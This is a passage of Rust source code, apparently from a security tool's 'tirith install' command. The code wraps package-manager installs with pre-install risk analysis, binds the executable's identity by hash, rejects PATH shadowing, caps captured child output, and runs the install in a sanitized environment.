//! `tirith install` — the safe-install transaction.
//!
//! `tirith install <npm|pip|cargo|url> <args...>` wraps a real package install
//! with pre-execution install-risk analysis and records the transaction. The
//! M3 assembly chunk: composes existing building blocks (engine rules,
//! `package_risk` scorer, `checkpoint`, `receipt`/`runner`, `audit`), no new
//! detection.
//!
//! Flow is **analyze → inform → record → run**: score before installing
//! (block refuses, warn needs ack, allow proceeds), checkpoint + audit, then
//! invoke the real install directly (never via a shell).
//!
//! ## What this is NOT
//!
//! Package-manager forms are analysis + a recorded transaction and do not
//! sandbox the real package manager. The URL form is stricter: the reviewed
//! script uses the shared verified capsule executor and fails closed instead of
//! running live bytes uncontained.

#[cfg(unix)]
use tirith_core::runner::{self, RunOptions};

use std::ffi::{OsStr, OsString};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use sha2::{Digest as _, Sha256};

use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::install_txn::{
    self, InstallArgv, InstallCoverageGap, InstallPlan, OnlineMode, PackageManager, PlanRequest,
};
use tirith_core::policy::Policy;
use tirith_core::registry_api::{self, HttpRegistryClient};
use tirith_core::style::Stream;
use tirith_core::threatdb::{Ecosystem, ThreatDb};
use tirith_core::verdict::{Action, Verdict};

/// Which install source the `<source>` positional selects.
///
/// M6 ch1 added eight distro/docker/go backends. These have no registry adapter,
/// so `--online` provenance signals degrade to `Unavailable` ("no registry
/// adapter for <eco>"); the CLI prints a banner (and embeds it in JSON) so weak
/// coverage is never silent.
#[derive(Clone, Copy, Debug, PartialEq, Eq, clap::ValueEnum)]
pub enum InstallSource {
    /// `npm install <pkg...>`
    Npm,
    /// `pip install <pkg...>`
    Pip,
    /// `cargo install <pkg...>`
    Cargo,
    /// `apt-get install <pkg...>` — Debian/Ubuntu.
    Apt,
    /// `brew install <pkg...>` — Homebrew.
    Brew,
    /// `dnf install <pkg...>` — Fedora / RHEL 8+.
    Dnf,
    /// `yum install <pkg...>` — RHEL 7 and earlier.
    Yum,
    /// `pacman -S <pkg...>` — Arch / Manjaro.
    Pacman,
    /// `scoop install <pkg...>` — Windows-only at the real-run step; `--no-exec`
    /// dry-run works on every OS.
    Scoop,
    /// `docker pull <image>[:<tag>|@<digest>]` — parsed with the engine's Docker parser.
    Docker,
    /// `go install <module>[@<version>]` — version defaults to `latest`.
    Go,
    /// Download and run an install script from a URL (delegates to `tirith run`).
    Url,
}

impl InstallSource {
    /// The package-manager mapping, or `None` for [`InstallSource::Url`].
    fn package_manager(self) -> Option<PackageManager> {
        match self {
            InstallSource::Npm => Some(PackageManager::Npm),
            InstallSource::Pip => Some(PackageManager::Pip),
            InstallSource::Cargo => Some(PackageManager::Cargo),
            InstallSource::Apt => Some(PackageManager::Apt),
            InstallSource::Brew => Some(PackageManager::Brew),
            InstallSource::Dnf => Some(PackageManager::Dnf),
            InstallSource::Yum => Some(PackageManager::Yum),
            InstallSource::Pacman => Some(PackageManager::Pacman),
            InstallSource::Scoop => Some(PackageManager::Scoop),
            InstallSource::Docker => Some(PackageManager::Docker),
            InstallSource::Go => Some(PackageManager::Go),
            InstallSource::Url => None,
        }
    }
}

/// One completed install. Streaming (human) mode populates only `exit_code`;
/// capture (JSON) mode drains `stdout`/`stderr` into bounded projections so the
/// JSON envelope can embed them rather than let them interleave on stdout.
#[derive(Debug, Clone, Default)]
pub struct InstallRunOutput {
    /// Process exit code (`None` on signal-termination).
    pub exit_code: Option<i32>,
    /// Captured stdout, only in capture mode.
    pub stdout: Option<String>,
    /// Captured stderr, only in capture mode.
    pub stderr: Option<String>,
}

/// Final package-manager JSON is capped at 256 KiB. Retain at most 16 KiB from
/// each child pipe while it is live: even worst-case JSON control-byte escaping
/// across both streams remains below the transport budget with room for schema
/// metadata. A stream that crosses the cap is drained to EOF but represented
/// only by a categorical omission receipt, avoiding both unbounded memory and a
/// redaction-defeating secret split at the retention boundary.
const MAX_PACKAGE_MANAGER_JSON_CHILD_BYTES: usize = 256 * 1024;
const MAX_PACKAGE_MANAGER_PIPE_BYTES: usize = MAX_PACKAGE_MANAGER_JSON_CHILD_BYTES / 16;

fn read_package_manager_pipe_bounded(mut pipe: impl std::io::Read) -> std::io::Result<String> {
    let mut retained = Vec::with_capacity(MAX_PACKAGE_MANAGER_PIPE_BYTES);
    let mut source_bytes = 0usize;
    let mut truncated = false;
    let mut chunk = [0u8; 8 * 1024];
    loop {
        let read = pipe.read(&mut chunk)?;
        if read == 0 {
            break;
        }
        source_bytes = source_bytes.saturating_add(read);
        if truncated {
            continue;
        }
        let available = MAX_PACKAGE_MANAGER_PIPE_BYTES.saturating_sub(retained.len());
        if read <= available {
            retained.extend_from_slice(&chunk[..read]);
        } else {
            // Do not emit a prefix that may end midway through a credential or
            // custom-DLP match. Continue draining, but discard all source bytes.
            retained.clear();
            truncated = true;
        }
    }
    if truncated {
        Ok(format!(
            "[child output truncated: omitted_bytes={source_bytes}, max_stream_bytes={MAX_PACKAGE_MANAGER_PIPE_BYTES}]"
        ))
    } else {
        Ok(String::from_utf8_lossy(&retained).into_owned())
    }
}

fn join_package_manager_pipe(
    reader: std::thread::JoinHandle<std::io::Result<String>>,
) -> std::io::Result<String> {
    reader
        .join()
        .map_err(|_| std::io::Error::other("package-manager output reader thread panicked"))?
}

fn capture_package_manager_output_bounded(
    command: &mut Command,
) -> std::io::Result<InstallRunOutput> {
    command.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = command.spawn()?;
    // From this point onward execution definitely started. Never turn a
    // capture/wait failure back into `Err`, because the caller reserves `Err`
    // for a launch that did not occur and records it as `ran: false`.
    let stdout = child.stdout.take();
    let stderr = child.stderr.take();
    let (stdout, stderr) = match (stdout, stderr) {
        (Some(stdout), Some(stderr)) => (stdout, stderr),
        (stdout, stderr) => {
            drop(stdout);
            drop(stderr);
            let exit_code = child.wait().ok().and_then(|status| status.code());
            return Ok(InstallRunOutput {
                exit_code,
                stdout: Some(
                    "[child stdout capture unavailable: pipe was not captured]".to_string(),
                ),
                stderr: Some(
                    "[child stderr capture unavailable: pipe was not captured]".to_string(),
                ),
            });
        }
    };

    let stdout_reader = match std::thread::Builder::new()
        .name("tirith-install-stdout".to_string())
        .spawn(move || read_package_manager_pipe_bounded(stdout))
    {
        Ok(reader) => reader,
        Err(_error) => {
            // Close the still-unread stderr pipe before waiting so the child
            // cannot block forever on a full pipe after thread creation fails.
            drop(stderr);
            let exit_code = child.wait().ok().and_then(|status| status.code());
            return Ok(InstallRunOutput {
                exit_code,
                stdout: Some(
                    "[child stdout capture unavailable: reader could not start]".to_string(),
                ),
                stderr: Some(
                    "[child stderr capture unavailable: reader could not start]".to_string(),
                ),
            });
        }
    };
    let stderr_reader = match std::thread::Builder::new()
        .name("tirith-install-stderr".to_string())
        .spawn(move || read_package_manager_pipe_bounded(stderr))
    {
        Ok(reader) => reader,
        Err(_error) => {
            let exit_code = child.wait().ok().and_then(|status| status.code());
            let stdout = join_package_manager_pipe(stdout_reader).unwrap_or_else(|_| {
                "[child stdout capture unavailable: bounded reader failed]".to_string()
            });
            return Ok(InstallRunOutput {
                exit_code,
                stdout: Some(stdout),
                stderr: Some(
                    "[child stderr capture unavailable: reader could not start]".to_string(),
                ),
            });
        }
    };

    // Readers drain concurrently so a child filling both pipes cannot deadlock.
    // Always join them after wait, even if wait itself fails.
    let status = child.wait();
    let stdout = join_package_manager_pipe(stdout_reader);
    let stderr = join_package_manager_pipe(stderr_reader);
    let exit_code = status.ok().and_then(|status| status.code());
    Ok(InstallRunOutput {
        exit_code,
        // The child status is authoritative once wait succeeds. A pipe-reader
        // failure must not erase the fact that execution happened or its exit
        // code; expose only a categorical marker because the I/O error text may
        // itself contain an untrusted path.
        stdout: Some(stdout.unwrap_or_else(|_| {
            "[child stdout capture unavailable: bounded reader failed]".to_string()
        })),
        stderr: Some(stderr.unwrap_or_else(|_| {
            "[child stderr capture unavailable: bounded reader failed]".to_string()
        })),
    })
}

/// Abstraction over running the real package-manager install. The production
/// impl ([`ProcessInstallRunner`]) spawns the real process; tests inject a fake
/// that never installs and never touches the network. Runs the resolved argv
/// directly, never via a shell.
///
/// Streaming inherits the terminal (live progress; captured fields `None`);
/// capture drains stdout/stderr into bounded projections for `--format json`.
pub trait InstallRunner {
    /// Run `program args...`. `capture` selects streaming vs capture. Only a
    /// launch failure is `Err`; after a successful spawn, capture/wait failures
    /// return `Ok` with categorical output and/or a `None` exit so the caller
    /// records that execution happened.
    fn run(
        &self,
        program: &str,
        args: &[String],
        capture: bool,
    ) -> std::io::Result<InstallRunOutput>;
}

/// Production [`InstallRunner`] — spawns only the package manager identity that
/// was resolved before analysis and approved by the operator.
pub struct ProcessInstallRunner<'a> {
    executable: &'a InstallExecutableBinding,
    source_binding: &'a InstallSourceBinding,
}

impl InstallRunner for ProcessInstallRunner<'_> {
    fn run(
        &self,
        program: &str,
        args: &[String],
        capture: bool,
    ) -> std::io::Result<InstallRunOutput> {
        // Launch the exact retained executable identity. Linux native binaries
        // use a fully sealed descriptor. Shebang entrypoints must retain a real
        // pathname because interpreters commonly resolve sibling resources from
        // that path; those launches instead receive an immediate identity and
        // digest revalidation below. The selected spelling is also retained as
        // argv[0], preserving multicall semantics such as `cargo -> rustup`.
        #[cfg(target_os = "linux")]
        let bound_fd = self.executable.trusted.bound_launch_fd();
        #[cfg(target_os = "linux")]
        let launch_program = bound_fd.map_or_else(
            || self.executable.path().as_os_str().to_os_string(),
            |fd| OsString::from(format!("/proc/self/fd/{fd}")),
        );
        #[cfg(not(target_os = "linux"))]
        let launch_program = self.executable.path().as_os_str().to_os_string();
        let mut command = Command::new(launch_program);
        #[cfg(unix)]
        {
            use std::os::unix::process::CommandExt as _;
            command.arg0(self.executable.path());
        }
        command.args(args);
        self.source_binding.configure_command(&mut command);
        // Keep both identity checks as close to the actual spawn as the
        // process API permits, after all command configuration is complete.
        // Verify the primary executable last so pathname scripts get the
        // narrowest available revalidation-to-exec window.
        self.source_binding.verify()?;
        self.executable.verify_program(program)?;
        #[cfg(target_os = "linux")]
        if let Some(fd) = bound_fd {
            use std::os::unix::process::CommandExt as _;

            // SAFETY: fcntl is async-signal-safe. The descriptor is a sealed
            // native image and must survive exec so `/proc/self/fd/N` remains
            // available to the kernel. Scripts never take this branch.
            unsafe {
                command.pre_exec(move || {
                    if libc::fcntl(fd, libc::F_SETFD, 0) < 0 {
                        return Err(std::io::Error::last_os_error());
                    }
                    Ok(())
                });
            }
        }
        if capture {
            // Stream and drain both pipes under a hard live-memory cap. A bare
            // `Command::output` retains attacker-sized manager output before the
            // final JSON projection gets a chance to bound it.
            capture_package_manager_output_bounded(&mut command)
        } else {
            // Streaming (human) mode — child stdio inherits the terminal.
            let mut child = command.spawn()?;
            let exit_code = child.wait().ok().and_then(|status| status.code());
            Ok(InstallRunOutput {
                exit_code,
                stdout: None,
                stderr: None,
            })
        }
    }
}

const MAX_INSTALL_EXECUTABLE_BYTES: u64 = 512 * 1024 * 1024;
const MAX_SOURCE_CONFIG_BYTES: u64 = 1024 * 1024;

/// Identity approved for one package-manager transaction. A later PATH change
/// cannot redirect execution, and replacement at the same path is rejected.
#[derive(Debug, Clone)]
struct InstallExecutableBinding {
    invocation_path: PathBuf,
    canonical_path: PathBuf,
    sha256: [u8; 32],
    /// Retains the selected provenance and, on Linux, the immutable executable
    /// descriptor from analysis through the final spawn.
    trusted: tirith_core::trusted_child::TrustedExecutable,
}

impl InstallExecutableBinding {
    fn resolve(program: &str) -> std::io::Result<Self> {
        let path_value = std::env::var_os("PATH").ok_or_else(|| {
            std::io::Error::new(
                std::io::ErrorKind::NotFound,
                format!("cannot resolve {program}: PATH is unset"),
            )
        })?;
        Self::resolve_on_path(program, &path_value)
    }

    fn resolve_on_path(program: &str, path_value: &OsStr) -> std::io::Result<Self> {
        let trusted = tirith_core::trusted_child::TrustedExecutable::resolve_on_path(
            program,
            path_value,
            &tirith_core::trusted_child::ambient_denied_roots(),
        )
        .map_err(std::io::Error::other)?;
        // Reject a writable first hit that actually shadows the same command in
        // a later system directory. A user-managed installation with no such
        // collision remains valid because its exact bytes/path identity are
        // bound below; repository and transient roots were already rejected by
        // TrustedExecutable.
        Self::reject_unsafe_path_selection(trusted.invocation_path(), path_value)?;
        Self::from_trusted(trusted)
    }

    fn from_trusted(
        trusted: tirith_core::trusted_child::TrustedExecutable,
    ) -> std::io::Result<Self> {
        Self::from_trusted_inner(trusted)
    }

    #[cfg(test)]
    fn from_trusted_for_test(
        trusted: tirith_core::trusted_child::TrustedExecutable,
    ) -> std::io::Result<Self> {
        Self::from_trusted_inner(trusted)
    }

    fn from_trusted_inner(
        trusted: tirith_core::trusted_child::TrustedExecutable,
    ) -> std::io::Result<Self> {
        let invocation_path = trusted.invocation_path().to_path_buf();
        let canonical_path = trusted.path().to_path_buf();
        #[cfg(target_os = "linux")]
        let trusted = match classify_linux_install_executable(&canonical_path)? {
            LinuxInstallExecutableKind::Native => {
                trusted.bind_content().map_err(std::io::Error::other)?
            }
            LinuxInstallExecutableKind::Script => trusted,
        };
        let sha256 = hash_install_executable(trusted.launch_path())?;
        Ok(Self {
            invocation_path,
            canonical_path,
            sha256,
            trusted,
        })
    }

    fn path(&self) -> &Path {
        &self.invocation_path
    }

    fn sha256_hex(&self) -> String {
        self.sha256
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect()
    }

    /// Package-manager identity is a non-bypassable transaction precondition.
    /// The planner assumes npm/pip/cargo/etc. semantics, so a same-UID PATH
    /// shadow must be rejected before analysis rather than represented as a
    /// policy finding that `TIRITH=0` could override.
    fn reject_unsafe_path_selection(
        invocation_path: &Path,
        path_value: &OsStr,
    ) -> std::io::Result<()> {
        let path_dirs: Vec<PathBuf> = std::env::split_paths(path_value).collect();
        let Some(parent) = invocation_path.parent() else {
            return Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                "selected package-manager executable has no parent directory",
            ));
        };
        let selected_name = invocation_path.file_name().ok_or_else(|| {
            std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                "selected package-manager executable has no file name",
            )
        })?;
        let current_dir = std::env::current_dir()?;
        let mut selected_index = None;
        for (index, directory) in path_dirs.iter().enumerate() {
            let absolute = if directory.is_absolute() {
                directory.clone()
            } else {
                current_dir.join(directory)
            };
            if absolute != parent {
                continue;
            }
            if !directory.is_absolute() {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::PermissionDenied,
                    format!(
                        "refusing package-manager executable {} selected through a relative PATH entry",
                        invocation_path.display()
                    ),
                ));
            }
            selected_index = Some(index);
            break;
        }
        let Some(selected_index) = selected_index else {
            return Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                "selected package-manager executable is not attributable to the approved PATH snapshot",
            ));
        };
        if !tirith_core::path_audit::writable_dir_precedes_system(parent, &path_dirs) {
            return Ok(());
        }

        let shadowed_system_executable = path_dirs
            .iter()
            .skip(selected_index + 1)
            .filter(|directory| {
                tirith_core::path_audit::SYSTEM_PATH_DIRS
                    .iter()
                    .any(|system| directory.as_path() == Path::new(system))
            })
            .map(|directory| directory.join(selected_name))
            .find(|candidate| tirith_core::path_audit::is_executable_file(candidate));
        let Some(shadowed_system_executable) = shadowed_system_executable else {
            return Ok(());
        };
        Err(std::io::Error::new(
            std::io::ErrorKind::PermissionDenied,
            format!(
                "refusing package-manager executable {} because it shadows later trusted system executable {}",
                invocation_path.display(),
                shadowed_system_executable.display()
            ),
        ))
    }

    fn verify_program(&self, program: &str) -> std::io::Result<()> {
        self.verify_program_with_denied(
            program,
            &tirith_core::trusted_child::ambient_denied_roots(),
        )
    }

    fn verify_program_with_denied(
        &self,
        program: &str,
        denied_roots: &[PathBuf],
    ) -> std::io::Result<()> {
        let requested = Path::new(program);
        if !requested.is_absolute() || requested != self.invocation_path {
            return Err(std::io::Error::other(
                "approved install executable path does not match the spawn path",
            ));
        }
        self.trusted.revalidate().map_err(std::io::Error::other)?;

        // A sealed Linux native executable is intentionally independent of any
        // later pathname or symlink change. Every pathname launch (including a
        // Linux shebang script) must still resolve to the approved canonical
        // identity and digest at the final spawn boundary.
        #[cfg(target_os = "linux")]
        if self.trusted.bound_launch_fd().is_some() {
            return Ok(());
        }
        let current =
            tirith_core::trusted_child::TrustedExecutable::from_absolute(requested, denied_roots)
                .map_err(std::io::Error::other)?;
        if current.invocation_path() != self.invocation_path
            || current.path() != self.canonical_path
        {
            return Err(std::io::Error::other(
                "approved install executable now resolves to a different path",
            ));
        }
        if hash_install_executable(current.path())? != self.sha256 {
            return Err(std::io::Error::other(
                "approved install executable changed after analysis",
            ));
        }
        self.trusted.revalidate().map_err(std::io::Error::other)?;
        Ok(())
    }
}

#[cfg(target_os = "linux")]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum LinuxInstallExecutableKind {
    Native,
    Script,
}

/// Linux can safely execute an ELF image through a sealed descriptor, but a
/// shebang interpreter needs the validated pathname so sibling-relative module
/// and resource lookup retains ordinary package-manager semantics.
#[cfg(target_os = "linux")]
fn classify_linux_install_executable(path: &Path) -> std::io::Result<LinuxInstallExecutableKind> {
    use std::io::Read as _;

    let mut file = std::fs::File::open(path)?;
    let mut prefix = [0_u8; 4];
    let count = file.read(&mut prefix)?;
    if count >= 2 && &prefix[..2] == b"#!" {
        return Ok(LinuxInstallExecutableKind::Script);
    }
    if count == prefix.len() && prefix == *b"\x7fELF" {
        return Ok(LinuxInstallExecutableKind::Native);
    }
    Err(std::io::Error::new(
        std::io::ErrorKind::InvalidData,
        format!(
            "install executable {} is neither an ELF native binary nor a shebang script",
            path.display()
        ),
    ))
}

fn hash_install_executable(path: &Path) -> std::io::Result<[u8; 32]> {
    use std::io::Read as _;

    let metadata = std::fs::metadata(path)?;
    if !metadata.is_file() {
        return Err(std::io::Error::other(
            "install executable is not a regular file",
        ));
    }
    if metadata.len() > MAX_INSTALL_EXECUTABLE_BYTES {
        return Err(std::io::Error::other(format!(
            "install executable exceeds the {MAX_INSTALL_EXECUTABLE_BYTES} byte identity limit"
        )));
    }
    let mut file = std::fs::File::open(path)?;
    let mut hasher = Sha256::new();
    let mut buffer = [0_u8; 64 * 1024];
    loop {
        let count = file.read(&mut buffer)?;
        if count == 0 {
            break;
        }
        hasher.update(&buffer[..count]);
    }
    Ok(hasher.finalize().into())
}

#[derive(Debug)]
enum CapturedSourceConfigState {
    Missing,
    Present {
        canonical_path: PathBuf,
        sha256: [u8; 32],
    },
}

#[derive(Debug)]
struct CapturedSourceConfig {
    requested_path: PathBuf,
    state: CapturedSourceConfigState,
}

impl CapturedSourceConfig {
    fn capture(path: PathBuf) -> std::io::Result<(Self, Option<String>)> {
        let metadata = match std::fs::symlink_metadata(&path) {
            Ok(metadata) => metadata,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                return Ok((
                    Self {
                        requested_path: path,
                        state: CapturedSourceConfigState::Missing,
                    },
                    None,
                ));
            }
            Err(error) => return Err(error),
        };
        if !metadata.file_type().is_file() && !metadata.file_type().is_symlink() {
            return Err(std::io::Error::other(format!(
                "source configuration {} is not a regular file",
                path.display()
            )));
        }
        let canonical_path = path.canonicalize()?;
        let (sha256, content) = hash_and_read_source_config(&canonical_path)?;
        Ok((
            Self {
                requested_path: path,
                state: CapturedSourceConfigState::Present {
                    canonical_path,
                    sha256,
                },
            },
            Some(content),
        ))
    }

    fn verify(&self) -> std::io::Result<()> {
        match &self.state {
            CapturedSourceConfigState::Missing => {
                match std::fs::symlink_metadata(&self.requested_path) {
                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
                    Ok(_) => Err(std::io::Error::other(format!(
                        "source configuration {} appeared after analysis",
                        self.requested_path.display()
                    ))),
                    Err(error) => Err(error),
                }
            }
            CapturedSourceConfigState::Present {
                canonical_path,
                sha256,
            } => {
                let current_canonical = self.requested_path.canonicalize()?;
                if &current_canonical != canonical_path {
                    return Err(std::io::Error::other(format!(
                        "source configuration {} now resolves to a different file",
                        self.requested_path.display()
                    )));
                }
                let (current_sha256, _) = hash_and_read_source_config(&current_canonical)?;
                if &current_sha256 != sha256 {
                    return Err(std::io::Error::other(format!(
                        "source configuration {} changed after analysis",
                        self.requested_path.display()
                    )));
                }
                Ok(())
            }
        }
    }
}

fn hash_and_read_source_config(path: &Path) -> std::io::Result<([u8; 32], String)> {
    use std::io::Read as _;

    let metadata = std::fs::metadata(path)?;
    if !metadata.is_file() || metadata.len() > MAX_SOURCE_CONFIG_BYTES {
        return Err(std::io::Error::other(format!(
            "source configuration {} is not a bounded regular file",
            path.display()
        )));
    }
    let file = std::fs::File::open(path)?;
    let mut bytes = Vec::with_capacity(metadata.len() as usize);
    file.take(MAX_SOURCE_CONFIG_BYTES.saturating_add(1))
        .read_to_end(&mut bytes)?;
    if bytes.len() as u64 > MAX_SOURCE_CONFIG_BYTES {
        return Err(std::io::Error::other(format!(
            "source configuration {} exceeds the {} byte limit",
            path.display(),
            MAX_SOURCE_CONFIG_BYTES
        )));
    }
    let content = String::from_utf8(bytes.clone()).map_err(|_| {
        std::io::Error::other(format!(
            "source configuration {} is not UTF-8",
            path.display()
        ))
    })?;
    Ok((Sha256::digest(&bytes).into(), content))
}

/// OS-derived process state for one approved install transaction.
///
/// Repository-controlled environment variables must not select a user profile,
/// temporary directory, Windows shell, or Windows system directory for the
/// package manager. Capture those paths from the operating system before the
/// plan is approved, keep the private temporary directory alive through child
/// exit, and apply this exact snapshot immediately before spawn.
#[derive(Debug)]
struct TrustedInstallEnvironment {
    account_home: PathBuf,
    private_temp: tempfile::TempDir,
    presentation: Vec<(OsString, OsString)>,
    sanitized_path: Option<OsString>,
    #[cfg(windows)]
    roaming_app_data: PathBuf,
    #[cfg(windows)]
    local_app_data: PathBuf,
    #[cfg(windows)]
    windows_directory: PathBuf,
    #[cfg(windows)]
    command_processor: PathBuf,
}

impl TrustedInstallEnvironment {
    fn capture(executable: Option<&InstallExecutableBinding>) -> std::io::Result<Self> {
        const PRESENTATION_NAMES: &[&str] = &[
            "LANG",
            "LC_ALL",
            "LC_CTYPE",
            "TERM",
            "COLORTERM",
            "NO_COLOR",
        ];

        let account_home = trusted_account_home()?;
        let presentation = PRESENTATION_NAMES
            .iter()
            .filter_map(|name| std::env::var_os(name).map(|value| (OsString::from(name), value)))
            .collect();

        #[cfg(unix)]
        let private_temp = trusted_install_tempdir(Path::new("/tmp"))?;

        #[cfg(unix)]
        let sanitized_path = trusted_install_child_path(
            executable,
            &[
                Path::new("/usr/bin"),
                Path::new("/bin"),
                Path::new("/usr/sbin"),
                Path::new("/sbin"),
            ],
            &[],
        );

        #[cfg(windows)]
        {
            let roaming_app_data = trusted_known_folder(
                &windows::Win32::UI::Shell::FOLDERID_RoamingAppData,
                "roaming application-data directory",
            )?;
            let local_app_data = trusted_known_folder(
                &windows::Win32::UI::Shell::FOLDERID_LocalAppData,
                "local application-data directory",
            )?;
            let (windows_directory, system_directory) = trusted_windows_directories()?;
            let transient_roots = [local_app_data.join("Temp")];
            ensure_trusted_install_directory(
                &account_home,
                "user profile directory",
                &transient_roots,
            )?;
            ensure_trusted_install_directory(
                &roaming_app_data,
                "roaming application-data directory",
                &transient_roots,
            )?;
            ensure_trusted_install_directory(
                &local_app_data,
                "local application-data directory",
                &transient_roots,
            )?;
            ensure_trusted_install_directory(
                &windows_directory,
                "Windows directory",
                &transient_roots,
            )?;
            ensure_trusted_install_directory(
                &system_directory,
                "system directory",
                &transient_roots,
            )?;
            let command_processor = system_directory.join("cmd.exe");
            let command_metadata = std::fs::metadata(&command_processor).map_err(|error| {
                std::io::Error::new(
                    error.kind(),
                    format!(
                        "cannot validate the OS command processor {}: {error}",
                        command_processor.display()
                    ),
                )
            })?;
            if !command_metadata.is_file() {
                return Err(std::io::Error::other(format!(
                    "OS command processor {} is not a regular file",
                    command_processor.display()
                )));
            }
            let sanitized_path = trusted_install_child_path(
                executable,
                &[system_directory.as_path(), windows_directory.as_path()],
                &transient_roots,
            );
            let private_temp = trusted_install_tempdir(&local_app_data)?;
            return Ok(Self {
                account_home,
                private_temp,
                presentation,
                sanitized_path,
                roaming_app_data,
                local_app_data,
                windows_directory,
                command_processor,
            });
        }

        #[cfg(unix)]
        {
            Ok(Self {
                account_home,
                private_temp,
                presentation,
                sanitized_path,
            })
        }

        #[cfg(not(any(unix, windows)))]
        {
            Err(std::io::Error::new(
                std::io::ErrorKind::Unsupported,
                "install execution environment isolation is unsupported on this platform",
            ))
        }
    }

    fn apply(&self, command: &mut Command) {
        command
            .env_clear()
            .envs(self.presentation.iter().cloned())
            .env("HOME", &self.account_home);
        for name in ["TMPDIR", "TMP", "TEMP", "TEMPDIR"] {
            command.env(name, self.private_temp.path());
        }
        if let Some(path) = &self.sanitized_path {
            command.env("PATH", path);
        }

        #[cfg(windows)]
        command
            .env("USERPROFILE", &self.account_home)
            .env("APPDATA", &self.roaming_app_data)
            .env("LOCALAPPDATA", &self.local_app_data)
            .env("SystemRoot", &self.windows_directory)
            .env("WINDIR", &self.windows_directory)
            .env("COMSPEC", &self.command_processor)
            .env("PATHEXT", ".COM;.EXE;.BAT;.CMD")
            // Windows command resolution otherwise checks the untrusted
            // current working directory before this bound PATH for bare names.
            .env("NoDefaultCurrentDirectoryInExePath", "1");
    }
}

fn trusted_install_child_path(
    executable: Option<&InstallExecutableBinding>,
    system_directories: &[&Path],
    additional_denied_roots: &[PathBuf],
) -> Option<OsString> {
    let mut directories = Vec::new();
    if let Some(executable) = executable {
        if let Some(parent) = executable.invocation_path.parent() {
            directories.push(parent.to_path_buf());
        }
        if let Some(parent) = executable.canonical_path.parent() {
            if !directories.iter().any(|existing| existing == parent) {
                directories.push(parent.to_path_buf());
            }
        }
    }
    for directory in system_directories {
        if !directories.iter().any(|existing| existing == directory) {
            directories.push((*directory).to_path_buf());
        }
    }
    let joined = std::env::join_paths(&directories).ok()?;
    let denied_roots = trusted_install_denied_roots(additional_denied_roots);
    let path = tirith_core::trusted_child::sanitized_path(&joined, &denied_roots);
    (!path.is_empty()).then_some(path)
}

fn trusted_install_denied_roots(additional: &[PathBuf]) -> Vec<PathBuf> {
    let mut roots = tirith_core::trusted_child::ambient_denied_roots();
    #[cfg(unix)]
    roots.extend(
        ["/tmp", "/var/tmp", "/dev/shm", "/run/user", "/var/folders"]
            .into_iter()
            .map(PathBuf::from),
    );
    roots.extend(additional.iter().cloned());
    roots.sort();
    roots.dedup();
    roots
}

fn ensure_trusted_install_directory(
    path: &Path,
    label: &str,
    additional_denied_roots: &[PathBuf],
) -> std::io::Result<()> {
    let joined = std::env::join_paths([path]).map_err(|error| {
        std::io::Error::other(format!("cannot validate OS-derived {label}: {error}"))
    })?;
    let sanitized = tirith_core::trusted_child::sanitized_path(
        &joined,
        &trusted_install_denied_roots(additional_denied_roots),
    );
    if sanitized.is_empty() {
        return Err(std::io::Error::other(format!(
            "OS-derived {label} {} is inside an untrusted root or has an unsafe ownership hierarchy",
            path.display()
        )));
    }
    Ok(())
}

#[cfg(unix)]
fn trusted_account_home() -> std::io::Result<PathBuf> {
    use std::ffi::CStr;
    use std::os::unix::ffi::OsStrExt as _;

    const FALLBACK_BUFFER_BYTES: usize = 16 * 1024;
    const MAX_BUFFER_BYTES: usize = 1024 * 1024;

    // SAFETY: sysconf and geteuid take no pointers and have no preconditions.
    let suggested = unsafe { libc::sysconf(libc::_SC_GETPW_R_SIZE_MAX) };
    let mut capacity = if suggested > 0 {
        usize::try_from(suggested)
            .unwrap_or(FALLBACK_BUFFER_BYTES)
            .clamp(FALLBACK_BUFFER_BYTES, MAX_BUFFER_BYTES)
    } else {
        FALLBACK_BUFFER_BYTES
    };
    // SAFETY: geteuid has no preconditions and returns the process effective UID.
    let effective_uid = unsafe { libc::geteuid() };

    loop {
        let mut record = std::mem::MaybeUninit::<libc::passwd>::uninit();
        let mut result = std::ptr::null_mut();
        let mut buffer = vec![0_u8; capacity];
        // SAFETY: `record`, `result`, and the writable buffer live for the call;
        // getpwuid_r writes at most `buffer.len()` bytes and initializes record
        // on success when it returns a non-null result pointer.
        let status = unsafe {
            libc::getpwuid_r(
                effective_uid,
                record.as_mut_ptr(),
                buffer.as_mut_ptr().cast(),
                buffer.len(),
                &mut result,
            )
        };
        if status == libc::ERANGE && capacity < MAX_BUFFER_BYTES {
            capacity = capacity.saturating_mul(2).min(MAX_BUFFER_BYTES);
            continue;
        }
        if status != 0 {
            return Err(std::io::Error::new(
                std::io::Error::from_raw_os_error(status).kind(),
                format!("cannot resolve the effective user's home directory: OS error {status}"),
            ));
        }
        if result.is_null() {
            return Err(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                "the effective user has no account database entry",
            ));
        }
        // SAFETY: a successful non-null getpwuid_r result initializes record,
        // and pw_dir points into `buffer`, which is still alive here.
        let record = unsafe { record.assume_init() };
        if record.pw_dir.is_null() {
            return Err(std::io::Error::other(
                "the effective user's account entry has no home directory",
            ));
        }
        // SAFETY: POSIX guarantees pw_dir is NUL-terminated on successful lookup.
        let home_bytes = unsafe { CStr::from_ptr(record.pw_dir) }.to_bytes();
        if home_bytes.is_empty() {
            return Err(std::io::Error::other(
                "the effective user's account entry has an empty home directory",
            ));
        }
        return canonical_trusted_account_path(Path::new(OsStr::from_bytes(home_bytes)), "home");
    }
}

#[cfg(windows)]
fn trusted_account_home() -> std::io::Result<PathBuf> {
    trusted_known_folder(
        &windows::Win32::UI::Shell::FOLDERID_Profile,
        "user profile directory",
    )
}

#[cfg(not(any(unix, windows)))]
fn trusted_account_home() -> std::io::Result<PathBuf> {
    Err(std::io::Error::new(
        std::io::ErrorKind::Unsupported,
        "OS account-home lookup is unsupported on this platform",
    ))
}

#[cfg(unix)]
